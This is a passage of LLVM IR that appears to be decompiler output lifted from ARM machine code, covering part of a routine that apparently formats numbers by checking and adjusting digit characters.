  store i32 %v0_14a74, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_14a8c = add i32 %v0_14a74, %stack_var_-192.6
  store i32 %v2_14a8c, i32* %ip.global-to-local, align 4
  %v1_14a90 = add i32 %v2_14a8c, 1
  %v3_14a90 = sub i32 0, %v2_14a8c
  %v4_14a90 = and i32 %v1_14a90, %v3_14a90
  %v5_14a90 = icmp slt i32 %v4_14a90, 0
  store i1 %v5_14a90, i1* %cpsr_v.global-to-local, align 1
  %v6_14a90 = icmp slt i32 %v1_14a90, 0
  store i1 %v6_14a90, i1* %cpsr_n.global-to-local, align 1
  %v7_14a90 = icmp eq i32 %v1_14a90, 0
  store i1 %v7_14a90, i1* %cpsr_z.global-to-local, align 1
  %v2_14a94 = xor i1 %v6_14a90, %v5_14a90
  br i1 %v2_14a94, label %dec_label_pc_14a98, label %dec_label_pc_14ab0

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a84
  %v2_14a98 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_14a98, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_14aa4 = bitcast i32* %stack_var_-79 to i8*
  %v3_14aa4 = call i32 @function_11d70(i8* %v2_14aa4, i32 48)
  store i32 %v3_14aa4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %bb237, %dec_label_pc_14a84, %dec_label_pc_14a98
  %v1_14af474 = phi i32 [ %v3_14aa4, %dec_label_pc_14a98 ], [ %v0_14a74, %dec_label_pc_14a84 ], [ %v0_14a24, %bb237 ]
  %v1_14ad8 = phi i32 [ -1, %dec_label_pc_14a98 ], [ %v2_14a8c, %dec_label_pc_14a84 ], [ %v0_14a74, %bb237 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_14a98 ], [ %stack_var_-192.6, %dec_label_pc_14a84 ], [ %stack_var_-192.6, %bb237 ]
  %v1_14ab4 = add i32 %v1_14ad8, -16
  %v3_14ab4 = sub i32 15, %v1_14ad8
  %v4_14ab4 = and i32 %v3_14ab4, %v1_14ad8
  %v5_14ab4 = icmp slt i32 %v4_14ab4, 0
  store i1 %v5_14ab4, i1* %cpsr_v.global-to-local, align 1
  %v6_14ab4 = icmp slt i32 %v1_14ab4, 0
  store i1 %v6_14ab4, i1* %cpsr_n.global-to-local, align 1
  %v7_14ab4 = icmp eq i32 %v1_14ad8, 16
  store i1 %v7_14ab4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_14ac0 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_14ac0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_14ac8 = xor i1 %v6_14ab4, %v5_14ab4
  %v4_14ac8 = or i1 %v7_14ab4, %v3_14ac8
  br i1 %v4_14ac8, label %dec_label_pc_14ad4, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_14ab0
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_14acc151 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_14acc151, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_14ad4:                               ; preds = %dec_label_pc_14ab0
  %v2_14ad4 = ptrtoint i32* %stack_var_-78 to i32
  %v2_14ad8 = add i32 %v1_14ad8, %v2_14ad4
  store i32 %v2_14ad8, i32* %r3.global-to-local, align 4
  %v1_14adc = add i32 %v2_14ad8, 2
  %v2_14adc = inttoptr i32 %v1_14adc to i8*
  %v3_14adc = load i8, i8* %v2_14adc, align 1
  %v4_14adc = zext i8 %v3_14adc to i32
  store i32 %v4_14adc, i32* %r2.global-to-local, align 4
  store i32 %v1_14adc, i32* %r1.global-to-local, align 4
  %v2_14ae4 = icmp ugt i8 %v3_14adc, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14ae4 = icmp ult i8 %v3_14adc, 52
  store i1 %v6_14ae4, i1* %cpsr_n.global-to-local, align 1
  %v7_14ae4 = icmp eq i8 %v3_14adc, 52
  store i1 %v7_14ae4, i1* %cpsr_z.global-to-local, align 1
  %v2_14ae8 = xor i1 %v2_14ae4, true
  %v3_14ae8 = or i1 %v7_14ae4, %v2_14ae8
  br i1 %v3_14ae8, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_14ad4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb239

bb239:                                            ; preds = %dec_label_pc_14ad4, %bb238
  %v1_14af472 = phi i32 [ %v1_14af474, %dec_label_pc_14ad4 ], [ 0, %bb238 ]
  %v2_14aec = xor i1 %v7_14ae4, true
  %v3_14aec = and i1 %v2_14ae4, %v2_14aec
  br i1 %v3_14aec, label %bb240, label %.preheader

bb240:                                            ; preds = %bb239
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb239, %bb240, %..preheader_crit_edge, %.backedge
  %v1_14af4 = phi i32 [ %v1_14af4.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_14af472, %bb239 ], [ 1, %bb240 ]
  %v0_14af0 = phi i32 [ %v0_14afc, %.backedge ], [ %v7_14acc151, %..preheader_crit_edge ], [ %v1_14adc, %bb239 ], [ %v1_14adc, %bb240 ]
  %v1_14af0 = add i32 %v0_14af0, -1
  %v2_14af0 = inttoptr i32 %v1_14af0 to i8*
  %v3_14af0 = load i8, i8* %v2_14af0, align 1
  %v4_14af0 = zext i8 %v3_14af0 to i32
  store i32 %v1_14af0, i32* %r1.global-to-local, align 4
  %v2_14af4 = add i32 %v4_14af0, %v1_14af4
  store i32 %v2_14af4, i32* %r3.global-to-local, align 4
  %v1_14af8 = trunc i32 %v2_14af4 to i8
  store i8 %v1_14af8, i8* %v2_14af0, align 1
  %v0_14afc = load i32, i32* %r1.global-to-local, align 4
  %v1_14afc = inttoptr i32 %v0_14afc to i8*
  %v2_14afc = load i8, i8* %v1_14afc, align 1
  %v3_14afc = zext i8 %v2_14afc to i32
  store i32 %v3_14afc, i32* %r2.global-to-local, align 4
  %v2_14b00 = icmp ugt i8 %v2_14afc, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14b00 = icmp ult i8 %v2_14afc, 57
  store i1 %v6_14b00, i1* %cpsr_n.global-to-local, align 1
  %v7_14b00 = icmp eq i8 %v2_14afc, 57
  store i1 %v7_14b00, i1* %cpsr_z.global-to-local, align 1
  %v2_14b04 = xor i1 %v2_14b00, true
  %v3_14b04 = or i1 %v7_14b00, %v2_14b04
  br i1 %v3_14b04, label %bb241, label %bb242

bb241:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb242

bb242:                                            ; preds = %.preheader, %bb241
  %v2_14b08 = xor i1 %v7_14b00, true
  %v3_14b08 = and i1 %v2_14b00, %v2_14b08
  br i1 %v3_14b08, label %bb243, label %._crit_edge75

._crit_edge75:                                    ; preds = %bb242
  %v1_14b10.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb244

bb243:                                            ; preds = %bb242
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb244

bb244:                                            ; preds = %._crit_edge75, %bb243
  %v1_14b10 = phi i32 [ %v1_14b10.pre, %._crit_edge75 ], [ 1, %bb243 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14b0c = icmp ult i8 %v2_14afc, 48
  store i1 %v6_14b0c, i1* %cpsr_n.global-to-local, align 1
  %v7_14b0c = icmp eq i8 %v2_14afc, 48
  store i1 %v7_14b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14b0c, label %.thread17, label %bb245

.thread17:                                        ; preds = %bb244
  %v2_14b10 = or i32 %v1_14b10, 1
  store i32 %v2_14b10, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14b1418 = icmp slt i32 %v2_14b10, 0
  store i1 %v1_14b1418, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb245:                                            ; preds = %bb244
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14b14 = icmp slt i32 %v1_14b10, 0
  store i1 %v1_14b14, i1* %cpsr_n.global-to-local, align 1
  %v2_14b14 = icmp eq i32 %v1_14b10, 0
  store i1 %v2_14b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b14, label %dec_label_pc_14b1c, label %.backedge

.backedge:                                        ; preds = %bb245, %.thread17
  %v1_14af4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_14b1c:                               ; preds = %bb245
  store i32 %v2_14ac0, i32* %r2.global-to-local, align 4
  %v2_14b20 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_14b20, i32* %r3.global-to-local, align 4
  %v2_14b24 = sub i32 %v0_14afc, %v2_14b20
  %v3_14b24 = icmp uge i32 %v0_14afc, %v2_14b20
  %v4_14b24 = xor i32 %v0_14afc, %v2_14b20
  %v5_14b24 = xor i32 %v2_14b24, %v0_14afc
  %v6_14b24 = and i32 %v5_14b24, %v4_14b24
  %v7_14b24 = icmp slt i32 %v6_14b24, 0
  store i1 %v7_14b24, i1* %cpsr_v.global-to-local, align 1
  %v8_14b24 = icmp slt i32 %v2_14b24, 0
  store i1 %v8_14b24, i1* %cpsr_n.global-to-local, align 1
  %v9_14b24 = icmp eq i32 %v0_14afc, %v2_14b20
  store i1 %v9_14b24, i1* %cpsr_z.global-to-local, align 1
  %v2_14b28 = xor i1 %v3_14b24, true
  %v3_14b28 = or i1 %v9_14b24, %v2_14b28
  br i1 %v3_14b28, label %bb246, label %.thread161

bb246:                                            ; preds = %dec_label_pc_14b1c
  store i32 %v2_14b20, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_14b20, i32* %r1.global-to-local, align 4
  br label %.thread161

.thread161:                                       ; preds = %dec_label_pc_14b1c, %bb246
  %v4_14b38159 = phi i32 [ %stack_var_-192.7, %bb246 ], [ %v2_14b20, %dec_label_pc_14b1c ]
  %v2_14b48 = phi i32 [ %v2_14b20, %bb246 ], [ %v0_14afc, %dec_label_pc_14b1c ]
  %v4_14b3c153158 = phi i32 [ %v2_14b20, %bb246 ], [ %v2_14ac0, %dec_label_pc_14b1c ]
  %v2_14b34 = xor i1 %v9_14b24, true
  %v3_14b34 = and i1 %v3_14b24, %v2_14b34
  br i1 %v3_14b34, label %bb247, label %bb248

bb247:                                            ; preds = %.thread161
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb248

bb248:                                            ; preds = %.thread161, %bb247
  br i1 %v3_14b28, label %bb249, label %bb250

bb249:                                            ; preds = %bb248
  %v5_14b38 = add i32 %v4_14b38159, 1
  store i32 %v5_14b38, i32* %r0.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %bb248, %bb249
  br i1 %v3_14b34, label %bb251, label %bb252

bb251:                                            ; preds = %bb250
  %v5_14b3c = add i32 %v4_14b3c153158, 2
  store i32 %v5_14b3c, i32* %r2.global-to-local, align 4
  br label %bb252

bb252:                                            ; preds = %bb250, %bb251
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14b44 = load i32, i32* @sl, align 4
  %v1_14b44 = add i32 %v0_14b44, -103
  %v3_14b44 = sub i32 102, %v0_14b44
  %v4_14b44 = and i32 %v3_14b44, %v0_14b44
  %v5_14b44 = icmp slt i32 %v4_14b44, 0
  store i1 %v5_14b44, i1* %cpsr_v.global-to-local, align 1
  %v6_14b44 = icmp slt i32 %v1_14b44, 0
  store i1 %v6_14b44, i1* %cpsr_n.global-to-local, align 1
  %v7_14b44 = icmp eq i32 %v0_14b44, 103
  store i1 %v7_14b44, i1* %cpsr_z.global-to-local, align 1
  %v3_14b48 = add i32 %v2_14b48, 1
  %v4_14b48 = inttoptr i32 %v3_14b48 to i8*
  store i8 0, i8* %v4_14b48, align 1
  %v0_14b4c = load i32, i32* %r1.global-to-local, align 4
  %v1_14b4c = add i32 %v0_14b4c, 1
  store i32 %v1_14b4c, i32* %r1.global-to-local, align 4
  %v0_14b50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b50, label %dec_label_pc_14b54, label %dec_label_pc_14b84

dec_label_pc_14b54:                               ; preds = %bb252
  %v0_14b54 = load i32, i32* %r0.global-to-local, align 4
  %v1_14b54 = load i32, i32* %ip.global-to-local, align 4
  %v2_14b54 = sub i32 %v0_14b54, %v1_14b54
  %v4_14b54 = xor i32 %v1_14b54, %v0_14b54
  %v5_14b54 = xor i32 %v2_14b54, %v0_14b54
  %v6_14b54 = and i32 %v5_14b54, %v4_14b54
  %v7_14b54 = icmp slt i32 %v6_14b54, 0
  %v8_14b54 = icmp slt i32 %v2_14b54, 0
  %v9_14b54 = icmp eq i32 %v0_14b54, %v1_14b54
  %v3_14b58 = xor i1 %v8_14b54, %v7_14b54
  %v4_14b58 = or i1 %v9_14b54, %v3_14b58
  %.274 = zext i1 %v4_14b58 to i32
  store i32 %.274, i32* %r3.global-to-local, align 4
  %v1_14b60 = add i32 %v0_14b54, 4
  %v3_14b60 = sub i32 0, %v0_14b54
  %v4_14b60 = and i32 %v1_14b60, %v3_14b60
  %v5_14b60 = icmp slt i32 %v4_14b60, 0
  store i1 %v5_14b60, i1* %cpsr_v.global-to-local, align 1
  %v6_14b60 = icmp slt i32 %v1_14b60, 0
  store i1 %v6_14b60, i1* %cpsr_n.global-to-local, align 1
  %v7_14b60 = icmp eq i32 %v1_14b60, 0
  store i1 %v7_14b60, i1* %cpsr_z.global-to-local, align 1
  %v2_14b64 = xor i1 %v6_14b60, %v5_14b60
  br i1 %v2_14b64, label %.thread21, label %bb255

.thread21:                                        ; preds = %dec_label_pc_14b54
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread164

bb255:                                            ; preds = %dec_label_pc_14b54
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14b68 = icmp eq i1 %v4_14b58, false
  store i1 %v2_14b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b68, label %.thread164, label %bb256

.thread164:                                       ; preds = %bb255, %.thread21
  %v1_14b703551 = load i32, i32* @sl, align 4
  store i32 %v1_14b703551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14b90

bb256:                                            ; preds = %bb255
  %v3_14b6c = sub i32 %v1_14b54, %v0_14b54
  store i32 %v3_14b6c, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b84:                               ; preds = %bb252
  %v0_14b84 = load i32, i32* @sl, align 4
  %v1_14b84 = add i32 %v0_14b84, -102
  %v3_14b84 = sub i32 101, %v0_14b84
  %v4_14b84 = and i32 %v3_14b84, %v0_14b84
  %v5_14b84 = icmp slt i32 %v4_14b84, 0
  store i1 %v5_14b84, i1* %cpsr_v.global-to-local, align 1
  %v6_14b84 = icmp slt i32 %v1_14b84, 0
  store i1 %v6_14b84, i1* %cpsr_n.global-to-local, align 1
  %v7_14b84 = icmp eq i32 %v0_14b84, 102
  store i1 %v7_14b84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14b84, i32* %r7.global-to-local, align 4
  br i1 %v7_14b84, label %dec_label_pc_14b84.dec_label_pc_14b9c_crit_edge, label %dec_label_pc_14b90

dec_label_pc_14b84.dec_label_pc_14b9c_crit_edge:  ; preds = %dec_label_pc_14b84
  %v0_14b9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b90:                               ; preds = %.thread164, %dec_label_pc_14b84
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14bac

dec_label_pc_14b9c:                               ; preds = %bb256, %dec_label_pc_14b84.dec_label_pc_14b9c_crit_edge
  %v0_14b9c = phi i32 [ %v0_14b54, %bb256 ], [ %v0_14b9c.pre, %dec_label_pc_14b84.dec_label_pc_14b9c_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_14b6c, %bb256 ], [ %v0_14a74, %dec_label_pc_14b84.dec_label_pc_14b9c_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14b9c = icmp slt i32 %v0_14b9c, 0
  store i1 %v1_14b9c, i1* %cpsr_n.global-to-local, align 1
  %v2_14b9c = icmp eq i32 %v0_14b9c, 0
  store i1 %v2_14b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14b9c, label %bb257, label %bb258

bb257:                                            ; preds = %dec_label_pc_14b9c
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_14ba4 = load i32, i32* %r2.global-to-local, align 4
  %v6_14ba4 = add i32 %v5_14ba4, -1
  %v7_14ba4 = inttoptr i32 %v6_14ba4 to i8*
  store i8 48, i8* %v7_14ba4, align 1
  %v8_14ba4 = load i32, i32* %r2.global-to-local, align 4
  %v9_14ba4 = add i32 %v8_14ba4, -1
  store i32 %v9_14ba4, i32* %r2.global-to-local, align 4
  %v0_14ba8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14bd8.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_14bdc.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14bdc.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb258

bb258:                                            ; preds = %dec_label_pc_14b9c, %bb257
  %v1_14bdc.pre = phi i1 [ %v1_14bdc.pre.pre, %bb257 ], [ false, %dec_label_pc_14b9c ]
  %v0_14bdc.pre = phi i1 [ %v0_14bdc.pre.pre, %bb257 ], [ false, %dec_label_pc_14b9c ]
  %v1_14bd8.pre = phi i32 [ %v1_14bd8.pre.pre, %bb257 ], [ %v1_14b4c, %dec_label_pc_14b9c ]
  %v0_14ba8 = phi i32 [ %v0_14ba8.pre, %bb257 ], [ %v0_14b9c, %dec_label_pc_14b9c ]
  store i32 %v0_14ba8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %dec_label_pc_14b90, %bb258
  %v0_14c44 = phi i32 [ 0, %dec_label_pc_14b90 ], [ %v0_14ba8, %bb258 ]
  %v1_14be0 = phi i1 [ false, %dec_label_pc_14b90 ], [ %v1_14bdc.pre, %bb258 ]
  %v0_14be0 = phi i1 [ false, %dec_label_pc_14b90 ], [ %v0_14bdc.pre, %bb258 ]
  %v1_14bd8 = phi i32 [ %v1_14b4c, %dec_label_pc_14b90 ], [ %v1_14bd8.pre, %bb258 ]
  %v1_14d00 = phi i32 [ %v0_14a74, %dec_label_pc_14b90 ], [ %stack_var_-184.3, %bb258 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_14bb8 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_14bb8, i32* %r3.global-to-local, align 4
  %v0_14bc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14bc4 = inttoptr i32 %v0_14bc4 to i8*
  %v2_14bc4 = load i8, i8* %v1_14bc4, align 1
  %v3_14bc4 = zext i8 %v2_14bc4 to i32
  store i32 %v3_14bc4, i32* %r3.global-to-local, align 4
  %v5_14bc4 = add i32 %v0_14bc4, 1
  store i32 %v5_14bc4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_14bc4, i32* %stack_var_-38, align 4
  %v2_14bd8 = sub i32 %v1_14bd8, %v5_14bc4
  store i32 %v2_14bd8, i32* %r1.global-to-local, align 4
  %v2_14bdc = xor i1 %v1_14be0, %v0_14be0
  br i1 %v2_14bdc, label %.thread166, label %dec_label_pc_14be4

.thread166:                                       ; preds = %dec_label_pc_14bac
  %v5_14bdc = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_14bdc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c54

dec_label_pc_14be4:                               ; preds = %dec_label_pc_14bac
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_14be8 = sub i32 %v0_14c44, %v2_14bd8
  %v4_14be8 = xor i32 %v2_14bd8, %v0_14c44
  %v5_14be8 = xor i32 %v2_14be8, %v0_14c44
  %v6_14be8 = and i32 %v5_14be8, %v4_14be8
  %v7_14be8 = icmp slt i32 %v6_14be8, 0
  store i1 %v7_14be8, i1* %cpsr_v.global-to-local, align 1
  %v8_14be8 = icmp slt i32 %v2_14be8, 0
  store i1 %v8_14be8, i1* %cpsr_n.global-to-local, align 1
  %v9_14be8 = icmp eq i32 %v0_14c44, %v2_14bd8
  store i1 %v9_14be8, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_14bf4 = xor i1 %v8_14be8, %v7_14be8
  br i1 %v2_14bf4, label %dec_label_pc_14c30, label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14be4
  store i32 %v2_14be8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_14be8, i1* %cpsr_n.global-to-local, align 1
  %v2_14bfc = icmp eq i32 %v2_14be8, 0
  store i1 %v2_14bfc, i1* %cpsr_z.global-to-local, align 1
  %tmp259 = icmp slt i32 %v2_14be8, 1
  br i1 %tmp259, label %.thread168, label %dec_label_pc_14c10

.thread168:                                       ; preds = %dec_label_pc_14bf8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14c50

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14bf8
  store i32 ptrtoint (i32* @global_var_1819f.416 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14c1c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_14c1c, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_14c54

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14be4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c30 = icmp slt i32 %v0_14c44, 0
  store i1 %v1_14c30, i1* %cpsr_n.global-to-local, align 1
  %v2_14c30 = icmp eq i32 %v0_14c44, 0
  store i1 %v2_14c30, i1* %cpsr_z.global-to-local, align 1
  %tmp260 = icmp slt i32 %v0_14c44, 1
  br i1 %tmp260, label %dec_label_pc_14c50, label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c30
  %v2_14c44 = sub i32 %v2_14bd8, %v0_14c44
  store i32 %v2_14c44, i32* %r1.global-to-local, align 4
  %v2_14c48 = add i32 %v5_14bc4, %v0_14c44
  store i32 %v2_14c48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c50

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14c40, %.thread168, %dec_label_pc_14c30
  %storemerge180.in = phi i32* [ %stack_var_-152, %dec_label_pc_14c30 ], [ %stack_var_-140, %.thread168 ], [ %stack_var_-140, %dec_label_pc_14c40 ]
  %v0_14c6889 = phi i32 [ %v2_14bd8, %dec_label_pc_14c30 ], [ 0, %.thread168 ], [ %v2_14c44, %dec_label_pc_14c40 ]
  %storemerge180 = ptrtoint i32* %storemerge180.in to i32
  store i32 %storemerge180, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14c54

dec_label_pc_14c54:                               ; preds = %.thread166, %dec_label_pc_14c10, %dec_label_pc_14c50
  %v1_14c8c = phi i32 [ %v2_14c1c, %dec_label_pc_14c10 ], [ %storemerge180, %dec_label_pc_14c50 ], [ %v5_14bdc, %.thread166 ]
  %v0_14ca497 = phi i32 [ -1, %dec_label_pc_14c10 ], [ -1, %dec_label_pc_14c50 ], [ %v0_14c44, %.thread166 ]
  %v0_14c68 = phi i32 [ 0, %dec_label_pc_14c10 ], [ %v0_14c6889, %dec_label_pc_14c50 ], [ %v2_14bd8, %.thread166 ]
  %v2_14c54 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_14c54, i32* %r2.global-to-local, align 4
  %v1_14c58 = add i32 %v2_14c54, 12
  %v2_14c58 = inttoptr i32 %v1_14c58 to i32*
  %v3_14c58 = load i32, i32* %v2_14c58, align 4
  %v1_14c5c = and i32 %v3_14c58, 16
  store i32 %v1_14c5c, i32* @lr, align 4
  %v2_14c5c = icmp eq i32 %v1_14c5c, 0
  %tmp283 = zext i1 %v2_14c5c to i32
  %.275 = xor i32 %tmp283, 1
  store i32 %.275, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c68 = icmp slt i32 %v0_14c68, 0
  store i1 %v1_14c68, i1* %cpsr_n.global-to-local, align 1
  %v2_14c68 = icmp eq i32 %v0_14c68, 0
  store i1 %v2_14c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c68, label %bb263, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_14c54
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c88

bb263:                                            ; preds = %dec_label_pc_14c54
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_14c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c5c, label %dec_label_pc_14c78, label %dec_label_pc_14c88

dec_label_pc_14c78:                               ; preds = %bb263
  store i32 %v1_14d00, i32* %r3.global-to-local, align 4
  %v0_14c7c = load i32, i32* @sl, align 4
  %v1_14c7c = add i32 %v0_14c7c, -103
  %v3_14c7c = sub i32 102, %v0_14c7c
  %v4_14c7c = and i32 %v3_14c7c, %v0_14c7c
  %v5_14c7c = icmp slt i32 %v4_14c7c, 0
  store i1 %v5_14c7c, i1* %cpsr_v.global-to-local, align 1
  %v6_14c7c = icmp slt i32 %v1_14c7c, 0
  store i1 %v6_14c7c, i1* %cpsr_n.global-to-local, align 1
  %v7_14c7c = icmp eq i32 %v0_14c7c, 103
  store i1 %v7_14c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14c7c, label %dec_label_pc_14ca4, label %bb264

bb264:                                            ; preds = %dec_label_pc_14c78
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_14c80 = icmp slt i32 %v1_14d00, 0
  store i1 %v2_14c80, i1* %cpsr_n.global-to-local, align 1
  %v3_14c80 = icmp eq i32 %v1_14d00, 0
  store i1 %v3_14c80, i1* %cpsr_z.global-to-local, align 1
  %tmp265 = icmp slt i32 %v1_14d00, 1
  br i1 %tmp265, label %dec_label_pc_14ca4, label %dec_label_pc_14c88

dec_label_pc_14c88:                               ; preds = %.thread40, %bb263, %bb264
  %v2_14c8c = inttoptr i32 %v1_14c8c to i32*
  store i32 112, i32* %v2_14c8c, align 4
  %v1_14c94 = load i32, i32* %r6.global-to-local, align 4
  %v2_14c94 = add i32 %v1_14c94, 4
  %v3_14c94 = inttoptr i32 %v2_14c94 to i32*
  store i32 1, i32* %v3_14c94, align 4
  store i32 ptrtoint (i32* @global_var_181ac.418 to i32), i32* %r3.global-to-local, align 4
  %v1_14c9c = load i32, i32* %r6.global-to-local, align 4
  %v2_14c9c = add i32 %v1_14c9c, 8
  %v3_14c9c = inttoptr i32 %v2_14c9c to i32*
  store i32 ptrtoint (i32* @global_var_181ac.418 to i32), i32* %v3_14c9c, align 4
  %v0_14ca0 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ca0 = add i32 %v0_14ca0, 12
  store i32 %v1_14ca0, i32* %r6.global-to-local, align 4
  %v0_14ca4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14ca4

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14c78, %bb264, %dec_label_pc_14c88
  %v1_14cb0 = phi i32 [ %v1_14c8c, %bb264 ], [ %v1_14ca0, %dec_label_pc_14c88 ], [ %v1_14c8c, %dec_label_pc_14c78 ]
  %v0_14ca4 = phi i32 [ %v0_14ca497, %bb264 ], [ %v0_14ca4.pre, %dec_label_pc_14c88 ], [ %v0_14ca497, %dec_label_pc_14c78 ]
  %v1_14ca4 = add i32 %v0_14ca4, 1
  store i32 %v1_14ca4, i32* %ip.global-to-local, align 4
  %v3_14ca4 = sub i32 0, %v0_14ca4
  %v4_14ca4 = and i32 %v1_14ca4, %v3_14ca4
  %v5_14ca4 = icmp slt i32 %v4_14ca4, 0
  store i1 %v5_14ca4, i1* %cpsr_v.global-to-local, align 1
  %v6_14ca4 = icmp slt i32 %v1_14ca4, 0
  store i1 %v6_14ca4, i1* %cpsr_n.global-to-local, align 1
  %v7_14ca4 = icmp eq i32 %v1_14ca4, 0
  store i1 %v7_14ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14ca4, label %dec_label_pc_14cc8, label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14ca4
  %v1_14cac = sub i32 -1, %v0_14ca4
